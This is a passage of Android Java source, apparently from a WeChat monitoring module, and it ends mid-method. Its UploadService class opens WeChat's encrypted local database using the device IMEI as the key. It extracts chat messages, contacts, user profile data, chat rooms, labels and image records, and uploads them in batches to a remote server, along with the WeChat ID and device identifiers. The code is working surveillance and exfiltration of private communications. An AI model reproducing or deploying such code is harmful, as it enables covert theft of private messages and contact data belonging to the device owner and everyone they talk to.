package live_library.wechat2;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.SPUtils;
import com.google.gson.Gson;
import com.mylike.keepalive.XApp;

import net.sqlcipher.database.SQLiteDatabase;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CountDownLatch;

import live_library.wechat2.bean.ChatRoom;
import live_library.wechat2.bean.ContactLabel;
import live_library.wechat2.bean.ImgFlag;
import live_library.wechat2.bean.JsonWrap;
import live_library.wechat2.bean.RMessage;
import live_library.wechat2.bean.Rcontact;
import live_library.wechat2.bean.Snscomment;
import live_library.wechat2.bean.Snsinfo;
import live_library.wechat2.bean.UserInfo;
import live_library.wechat2.bean.UserInfo2;
import live_library.wechat2.bean.VoiceInfo;
import live_library.wechat2.db.SqlDataUtil;
import live_library.wechat2.helper.ChatRoomHelper;
import live_library.wechat2.helper.ContactLabelHelper;
import live_library.wechat2.helper.ImgFlagHelper;
import live_library.wechat2.helper.MessageHelper;
import live_library.wechat2.helper.RcontactHelper;
import live_library.wechat2.helper.SnscommentHelper;
import live_library.wechat2.helper.SnsinfoHelper;
import live_library.wechat2.helper.UserInfo2Helper;
import live_library.wechat2.helper.UserInfoHelper;
import live_library.wechat2.helper.VoiceinfoHelper;
import live_library.wechat2.http.RequestQueueSingle;
import live_library.wechat2.uploadpic.UploadPicService;
import live_library.wechatlog.RLog;

import static android.content.Context.MODE_PRIVATE;
import static live_library.wechat2.db.SqlDataUtil.WX_DB_FILE_NAME;

public class UploadService {

    /**
     * 上传条数
     */
    private float pageSize = 50f;
    private int maxRetryCount = 1;

    private static volatile UploadService mInstance;
    private final static String TAG = "UploadService";

    private final static String TABLE_MESSAGE = "table_message";
    private final static String TABLE_CONTACT = "table_contact";
    private final static String TABLE_VOICE_INFO = "table_voice_info";
    private final static String TABLE_USER_INFO = "table_user_info";
    private final static String TABLE_USER_INFO2 = "table_user_info2";
    private final static String TABLE_CHAT_ROOM = "table_chat_room";
    private final static String TABLE_CONTACT_LABEL = "table_contact_label";
    private final static String TABLE_IMG_FLAG = "table_img_flag";
    private final static String TABLE_SNS_INFO = "table_sns_info";
    private final static String TABLE_SNS_COMMENT = "table_sns_comment";


    //联系人库
    private SQLiteDatabase contactDb;
    private SQLiteDatabase contactDb2;
    //短信库
    private SQLiteDatabase snsDb;

    private String imei;
    private File copyWxDataDb;
    public static Context mContext;

    @SuppressLint("MissingPermission")
    private UploadService() {
        imei = UploadPicService.getImei();
        //将微信数据库拷贝出来，因为直接连接微信的db，会导致微信崩溃
        //获取微信数据库存放地址
        String userFileName = SqlDataUtil.md5("mm" + SqlDataUtil.getCurrWxUin());
        File wxDataDir = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName);
        RLog.d(TAG, "copy微信路径:" + wxDataDir.exists());
        //复制到本地地址
        String copyFilePath = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB;
        String copyFilePathWal = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB_WAL;
        String copyFilePathShm = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB_SHM;


        RLog.d(TAG, "开始查找微信数据库路径");
        //原始数据库
        File file = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName + "/" + WX_DB_FILE_NAME);
        File fileWal = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME_WAL);
        File fileShm = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME_SHM);

        if (file != null) {
            RLog.d(TAG, "查找到微信数据库路径:" + file.getAbsolutePath());
            //开始复制
//            SqlDataUtil.copyFile(file.getAbsolutePath(), copyFilePath);
            RLog.d(TAG, "复制到数据库路径:" + copyFilePath);
            //链接数据库拿取数据
//            copyWxDataDb = new File(copyFilePath);
            copyWxDataDb = new File(SqlDataUtil.WX_DB_DIR_PATH()+userFileName + "/" + WX_DB_FILE_NAME);
        }

        if (fileWal != null) {
            RLog.d(TAG, "查找到微信数据库路径:" + fileWal.getAbsolutePath());
//            SqlDataUtil.copyFile(fileWal.getAbsolutePath(), copyFilePathWal);
            RLog.d(TAG, "复制到数据库路径:" + copyFilePathWal);
        }

        if (fileShm != null) {
            RLog.d(TAG, "查找到微信数据库路径:" + fileShm.getAbsolutePath());
//            SqlDataUtil.copyFile(fileShm.getAbsolutePath(), copyFilePathShm);
            RLog.d(TAG, "复制到数据库路径:" + copyFilePathShm);
        }

       /* String smsPath = Environment.getExternalStorageDirectory() + "/yes/SnsMicroMsg.db";
        snsDb = SqlDataUtil.openWxDb1(new File(smsPath), "");*/
    }

    public static UploadService getInstance(Context context) {
        mContext = context;
        mInstance = new UploadService();
        return mInstance;
    }
    public static Context getContext() {
        if (mContext==null){
            RLog.d(TAG, "UploadService-getContext:" + null);
        }
        return XApp.getApp();
    }


    /**
     * 根据表名 获取时间最新提交到服务器的时间错
     *
     * @param tableName
     * @param map
     * @return
     */
    public String getTampByTableName(String tableName, Map<String, String> map) {
        if (map.get(tableName) == null) {
            return "0";
        }
        return map.get(tableName);
    }

    /**
     * 上传文件（消息表，10分钟跳一次）
     * egCreateTime true 代码升序标识为
     * egCreateTime false  倒序标识位
     */
    public void startUpload() {
        try {//copyWxDataDb： /data/data/io.va.exposed/wx_data.db
            //imei: 99001068505792
            contactDb = SqlDataUtil.openCommonWxDb(copyWxDataDb, imei);
            if (contactDb == null){
                return;
            }
            // String copyFilePath = Environment.getExternalStorageDirectory()+"/yes/"+WX_DB_FILE_NAME;
            // if (contactDb != null) {
            //    contactDb = SqlDataUtil.openWxDb2(new File(copyFilePath), imei);

            final List<UserInfo> list = UserInfoHelper.getUserInfoList(contactDb);
            //查找微信id
            String wxId = "";
            if (list.size() > 0) {
                for (UserInfo userInfo : list) {
                    if ("2".equals(userInfo.id)) {
                        wxId = userInfo.value;
                    }
                }
            }
            SharedPreferences mSharedPreferences =  XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
            SharedPreferences.Editor editor = mSharedPreferences.edit();
            editor.putString("wxIdOne", wxId);
            editor.commit();
            RLog.d(TAG, "wxId:" + wxId);
            Map<String, String> map = SqlDataUtil.getTableStamps();
            uploadMessage(wxId, getTampByTableName(TABLE_MESSAGE, map));
            uploadRContact(wxId, getTampByTableName(TABLE_CONTACT, map));
            uploadUserInfo(wxId, getTampByTableName(TABLE_USER_INFO, map));
            uploadContactLabel(wxId, getTampByTableName(TABLE_CONTACT_LABEL, map));
            uploadImgFlag(wxId, getTampByTableName(TABLE_IMG_FLAG, map));
            UploadPicService.getInstance().openData(wxId);//上传聊天图片
            UploadPicService.getInstance().openRuning(wxId);//上传聊天图片
            RLog.d(TAG,"数据全部处理完成");
            contactDb.close();
            // }

//            snsDb.close();
        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    /**
     * 上传文件（1天跳一次）
     */
    public void startUpload2() {
        try {
            contactDb2 = SqlDataUtil.openWxDb(copyWxDataDb, imei);
//            uploadRContact("0");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void uploadMessage(String wxId, String updateTime) {
        RLog.d(TAG, "uploadMessage");
        try {
            int totalCount = MessageHelper.getTotalCount(contactDb, updateTime);
            RLog.d(TAG, "这一行执行-uploadMessage-totalCount:"+totalCount);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadMessageToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();
        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadRContact(String wxId, String updateTime) {
        RLog.d(TAG, "uploadRContact");
        try {
            int totalCount = RcontactHelper.getTotalCount(contactDb);
            if (totalCount == 0) {
                return;
            }
            int totalCount1 = SPUtils.getInstance().getInt("RContact_totalCount");
            if (totalCount1 ==totalCount) {
                return;
            }
            SPUtils.getInstance().put("RContact_totalCount", totalCount);
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadRcontactToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();
        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }


    public void uploadVoiceInfo(String wxId, String updateTime) {
        RLog.d(TAG, "uploadVoiceInfo");
        try {

            int totalCount = VoiceinfoHelper.getTotalCount(contactDb, updateTime);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadVoiceInfoToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();
//
        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadUserInfo2(String wxId, String updateTime) {
        try {
            RLog.d(TAG, "uploadUserInfo2");
            int totalCount = UserInfo2Helper.getTotalCount(contactDb);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadUserInfo2ToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();
        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadUserInfo(String wxId, String updateTime) {
        try {
            RLog.d(TAG, "uploadUserInfo");

            int totalCount = UserInfoHelper.getTotalCount(contactDb);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadUserInfoToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();

        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadChatRoom(String wxId, String updateTime) {
        try {
            RLog.d(TAG, "uploadChatRoom");

            int totalCount = ChatRoomHelper.getTotalCount(contactDb, updateTime);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadChatRoomToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();

        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }


    public void uploadContactLabel(String wxId, String updateTime) {
        try {
            RLog.d(TAG, "uploadContactLabel");

            int totalCount = ContactLabelHelper.getTotalCount(contactDb, updateTime);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadContactLabelToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();

        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }


    public void uploadImgFlag(String wxId, String updateTime) {
        RLog.d(TAG, "uploadImgFlag");
        try {
            int totalCount = ImgFlagHelper.getTotalCount(contactDb, updateTime);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadImgFlagToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();
        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }


    public void uploadSnsinfo(String wxId, String updateTime) {
        try {
            RLog.d(TAG, "uploadSnsinfo");

            int totalCount = SnsinfoHelper.getTotalCount(snsDb, updateTime);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadSnsinfoToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();

        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void uploadSnscomment(String wxId, String updateTime) {
        RLog.d(TAG, "uploadSnscomment");
        try {
            int totalCount = SnscommentHelper.getTotalCount(snsDb, updateTime);
            if (totalCount == 0) {
                return;
            }
            int pageCount = (int) Math.ceil(totalCount / pageSize);
            CountDownLatch countDownLatch = new CountDownLatch(pageCount);
            uploadSnscommentToServer(wxId, 0, pageCount, 0, countDownLatch, updateTime);
            countDownLatch.await();

        } catch (Exception e) {
            e.printStackTrace();
            RLog.d(TAG, e.getMessage());
        }
    }

    public void releaseCountDownLatch(int currentCount, int totalCount, CountDownLatch countDownLatch) {
        for (int i = 0; i < totalCount - currentCount; i++) {
            countDownLatch.countDown();
        }
    }

    public void uploadMessageToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {
        RLog.d(TAG, "uploadMessageToServer totalCount: "+totalCount+";currentCount:"+currentCount);
        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadMessageToServer 结束传输数据 ");
            return;
        }

        RLog.d(TAG, "uploadMessageToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;

        final List<RMessage> list = MessageHelper.getMessageList(contactDb, updateTime, (int) pageStart, (int) pageSize);
        RLog.d(TAG, "uploadMessageToServer:" + list.size());

        JsonWrap<RMessage> jsonWrap = new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("2");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "开始传输数据【" + json + "】");

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadMessageToServer 传输数据成功：【" + response + "】");
                //更新上传成功最新时间错
                if (list.size() > 0) {
                    RMessage data = list.get(list.size() - 1);
                    SqlDataUtil.updateTableStamp(TABLE_MESSAGE, data.getCreateTime());
                }
                countDownLatch.countDown();

//                 messageDao.insert(rMessages);
                uploadMessageToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadMessageToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadMessageToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadMessageToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadMessageToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(XApp.getApp()).add(stringRequest);
    }

    public void uploadRcontactToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {

        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadRcontactToServer 结束传输数据 ");
//            uploadVoiceInfo(egCreateTime);
            return;
        }

        RLog.d(TAG, "uploadRcontactToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;

        final List<Rcontact> list = RcontactHelper.getRcontactList(contactDb, (int) pageStart, (int) pageSize);
        RLog.d(TAG, "uploadRcontactToServer:" + list.size());
        JsonWrap<Rcontact> jsonWrap = new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("4");
        jsonWrap.setVxid(wxId);
        if (currentCount+1==totalCount) {
            jsonWrap.setOver("over");
        }else {
            jsonWrap.setOver("process");
        }
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadRcontactToServer 传输数据成功：【" + response + "】");
                countDownLatch.countDown();
                uploadRcontactToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadRcontactToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadRcontactToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadRcontactToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());

            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadRcontactToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
//        Volley.newRequestQueue(XApp.getApp()).add(stringRequest);
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
    }


    public void uploadVoiceInfoToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {

        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadVoiceInfoToServer 结束传输数据 ");
//            uploadUserInfo2(egCreateTime);
            return;
        }

        RLog.d(TAG, "uploadVoiceInfoToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;

        final List<VoiceInfo> list = VoiceinfoHelper.getVoiceInfoList(contactDb, updateTime, (int) pageStart, (int) pageSize);
        RLog.d(TAG, "uploadVoiceInfoToServer:" + list.size());
        JsonWrap<VoiceInfo> jsonWrap = new JsonWrap();
        jsonWrap.setJsonInfo(list);
//        jsonWrap.setType("4");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "开始传输数据【" + json + "】");


        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadVoiceInfoToServer 传输数据成功：【" + response + "】");
                //更新上传成功最新时间错
                if (list.size() > 0) {
                    VoiceInfo data = list.get(list.size() - 1);
                    SqlDataUtil.updateTableStamp(TABLE_VOICE_INFO, data.getCreateTime());
                }
                countDownLatch.countDown();
                uploadVoiceInfoToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadVoiceInfoToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadVoiceInfoToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadVoiceInfoToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadVoiceInfoToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(mContext).add(stringRequest);
    }

    public void uploadUserInfo2ToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {

        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadUserInfo2ToServer 结束传输数据 ");
//            uploadUserInfo2(egCreateTime);
            return;
        }

        RLog.d(TAG, "uploadUserInfo2ToServer 传输数据 " + currentCount + " = " + totalCount);
        final List<UserInfo2> list = UserInfo2Helper.getUserInfo2List(contactDb);
        RLog.d(TAG, "uploadUserInfo2ToServer:" + list.size());
        JsonWrap<UserInfo2> jsonWrap = new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("3");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "uploadUserInfo2ToServer 开始传输数据【" + json + "】");

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

                RLog.d(TAG, "uploadUserInfo2ToServer 传输数据成功：【" + response + "】");
                countDownLatch.countDown();
                uploadUserInfo2ToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadUserInfo2ToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadUserInfo2ToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadUserInfo2ToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadUserInfo2ToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
//        Volley.newRequestQueue(mContext).add(stringRequest);
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
    }

    public void uploadUserInfoToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {
        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadUserInfoToServer 结束传输数据 ");
            return;
        }

        RLog.d(TAG, "uploadUserInfoToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;
        final List<UserInfo> list = UserInfoHelper.getUserInfoList(contactDb);
        UserInfo version = new UserInfo();
        version.id = "version";
        version.value = AppUtils.getAppVersionName();
        list.add(version);
        UserInfo version1 = new UserInfo();
        version1.id = "RegId";
        SharedPreferences mSharedPreferences1 =  XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
        version1.value = mSharedPreferences1.getString("RegId","");
        list.add(version1);
        UserInfo version2 = new UserInfo();
        version2.id = "tenantDept";
        version2.value = SqlDataUtil.readDept();
        list.add(version2);
        RLog.d(TAG, "uploadUserInfoToServer:" + list.size());
        JsonWrap<UserInfo> jsonWrap = new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("3");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "开始传输数据【" + json + "】");
//        final UserInfo dao =new UserInnfoDao(BaseApplication.mContext);

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadUserInfoToServer 传输数据成功：【" + response + "】");
                countDownLatch.countDown();
                uploadUserInfoToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadUserInfoToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadUserInfoToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadUserInfoToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());

            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadUserInfoToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
//        Volley.newRequestQueue(mContext).add(stringRequest);
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
    }

    public void uploadChatRoomToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {
        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadChatRoomToServer 结束传输数据 ");
            return;
        }

        RLog.d(TAG, "uploadChatRoomToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;
        final List<ChatRoom> list = ChatRoomHelper.getChatRoomList(contactDb, updateTime, (int) pageStart, (int) pageSize);
        RLog.d(TAG, "uploadUserInfoToServer:" + list.size());
        JsonWrap<ChatRoom> jsonWrap = new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("5");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "uploadChatRoomToServer 开始传输数据【" + json + "】");
//        final UserInfo dao =new UserInnfoDao(BaseApplication.mContext);

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadChatRoomToServer 传输数据成功：【" + response + "】");
                //更新上传成功最新时间错
                if (list.size() > 0) {
                    ChatRoom data = list.get(list.size() - 1);
                    SqlDataUtil.updateTableStamp(TABLE_CHAT_ROOM, data.modifytime);
                }
                countDownLatch.countDown();
                uploadChatRoomToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadChatRoomToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadChatRoomToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadChatRoomToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadUserInfoToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
//        Volley.newRequestQueue(mContext).add(stringRequest);
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
    }

    public void uploadContactLabelToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {
        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadContactLabelToServer 结束传输数据 ");
//            uploadUserInfo2(egCreateTime);
            return;
        }

        RLog.d(TAG, "uploadContactLabelToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;
        final List<ContactLabel> list = ContactLabelHelper.getContactLabelList(contactDb, updateTime, (int) pageStart, (int) pageSize);
        RLog.d(TAG, "uploadContactLabelToServer:" + list.size());
        JsonWrap<ContactLabel> jsonWrap = new JsonWrap();
